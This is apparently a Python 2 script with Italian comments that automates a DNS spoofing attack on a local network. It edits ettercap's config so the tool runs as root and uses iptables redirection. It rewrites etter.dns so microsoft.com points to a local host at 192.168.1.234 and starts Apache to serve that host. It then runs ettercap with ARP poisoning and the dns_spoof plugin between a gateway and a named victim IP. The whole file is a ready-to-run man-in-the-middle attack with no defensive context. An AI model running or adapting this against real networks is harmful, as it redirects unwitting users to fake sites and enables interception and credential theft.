import os

ettercap_file_path= "/etc/ettercap/etter.conf"		#posizione del file etter.conf da modificare
ettercap_dns_file_path = "/etc/ettercap/etter.dns"	#posizione del file etter.dns che contiene le associazioni da fare per mettere a segno lo spoofing
mTargetIP = ''
local_gateway = ''


def ettercap_file_editor():

	print "editing etter.conf..."
	with open(ettercap_file_path, 'r') as file:
		filedata = file.read()
	
	#apporto le modifiche al file
	filedata = filedata.replace('ec_uid = 65534', 'ec_uid = 0')
	filedata = filedata.replace('ec_gid = 65534', 'ec_gid = 0')

	filedata = filedata.replace('#redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"','redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"') 
	filedata = filedata.replace('#redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"','redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"')

	# Write the file out again
	with open(ettercap_file_path, 'w') as file:
  		file.write(filedata)
	file.close()

def dns_file_editor():
	print 'ettercap\'s dns file editing...'
	with open(ettercap_dns_file_path, 'r') as file:
		filedata = file.read()
	
	#apporto le modifiche al file
	filedata = filedata.replace('microsoft.com      A   107.170.40.56', 'microsoft.com      A   192.168.1.234')
	filedata = filedata.replace('*.microsoft.com      A   107.170.40.56', '*.microsoft.com      A   192.168.1.234')

	# Write the file out again
	with open(ettercap_dns_file_path, 'w') as file:
  		file.write(filedata)
	file.close()

def dns_spoofing():
	os.system('ettercap -T -q -i eth0 -M arp:remote -P dns_spoof //192.168.1.254//192.168.1.83')


def start():
	try:
		ettercap_file_editor()
		dns_file_editor()
		os.system('service apache2 start')
		dns_spoofing()
		
    	except KeyboardInterrupt:
        	print 'stop'
        	
start()

try:
    while True:
        pass
except KeyboardInterrupt:
    print 'stop'
